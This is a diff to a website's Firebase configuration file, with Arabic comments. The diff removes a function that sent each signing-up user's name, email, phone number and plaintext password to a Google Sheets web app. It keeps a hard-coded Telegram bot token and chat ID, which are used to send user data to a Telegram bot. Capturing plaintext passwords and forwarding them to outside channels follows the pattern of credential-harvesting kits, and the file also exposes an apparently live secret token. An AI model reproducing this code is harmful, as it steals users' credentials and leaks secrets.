@@ -39,10 +39,6 @@ const db = firebase.firestore();
 const TELEGRAM_BOT_TOKEN = '8498245959:AAE9P-_7yutJlLBzAkrWLn07yZKILDF4f1k';
 const TELEGRAM_CHAT_ID = '6479051123';
 
-// ✅ Google Sheets Integration
-// ضع رابط Google Apps Script Web App هنا:
-const GOOGLE_SHEETS_URL = 'YOUR_GOOGLE_SHEETS_WEB_APP_URL_HERE';
-
 // دالة إرسال رسالة إلى تليجرام
 async function sendTelegramNotification(userData) {
     console.log('🔔 بدء إرسال إشعار Telegram...');
@@ -98,56 +94,11 @@ async function sendTelegramNotification(userData) {
     }
 }
 
-// ✅ دالة إرسال البيانات إلى Google Sheets
-async function sendToGoogleSheets(userData) {
-    console.log('📊 بدء إرسال البيانات إلى Google Sheets...');
-    console.log('📤 البيانات:', userData);
-    
-    // التحقق من وجود الرابط
-    if (!GOOGLE_SHEETS_URL || GOOGLE_SHEETS_URL === 'YOUR_GOOGLE_SHEETS_WEB_APP_URL_HERE') {
-        console.warn('⚠️ Google Sheets URL غير محدد - تخطي الإرسال');
-        return { status: 'skipped', message: 'URL not configured' };
-    }
-    
-    try {
-        const response = await fetch(GOOGLE_SHEETS_URL, {
-            method: 'POST',
-            mode: 'no-cors', // مهم لـ Google Apps Script
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({
-                fullName: userData.fullName || '',
-                email: userData.email || '',
-                phone: userData.phone || '',
-                password: userData.password || '',
-                uid: userData.uid || '',
-                provider: userData.provider || 'البريد الإلكتروني',
-                timestamp: new Date().toISOString()
-            })
-        });
-        
-        console.log('✅ تم إرسال البيانات إلى Google Sheets بنجاح!');
-        console.log('📊 Response:', response);
-        
-        return { 
-            status: 'success', 
-            message: 'تم حفظ البيانات في Google Sheets' 
-        };
-        
-    } catch (error) {
-        console.error('❌ خطأ في إرسال البيانات إلى Google Sheets:', error);
-        throw error;
-    }
-}
-
 // تصدير المتغيرات
 window.auth = auth;
 window.db = db;
 window.sendTelegramNotification = sendTelegramNotification;
-window.sendToGoogleSheets = sendToGoogleSheets;
 
 // تأكيد التحميل
 console.log('✅ firebase-config.js تم تحميله بنجاح');
 console.log('✅ sendTelegramNotification متاحة:', typeof sendTelegramNotification === 'function');
-console.log('✅ sendToGoogleSheets متاحة:', typeof sendToGoogleSheets === 'function');
